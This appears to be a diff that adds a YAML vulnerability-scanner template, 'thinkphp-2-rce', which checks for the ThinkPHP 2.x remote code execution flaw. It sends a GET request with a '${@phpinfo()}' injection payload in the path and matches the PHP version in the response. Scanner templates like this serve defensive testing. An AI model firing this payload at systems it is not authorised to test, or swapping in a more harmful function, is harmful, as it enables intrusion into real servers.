@@ -1,0 +1,9 @@
+name: thinkphp-2-rce
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php?s=/index/index/name/$%7B@phpinfo()%7D
+        expression: |
+            response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0()
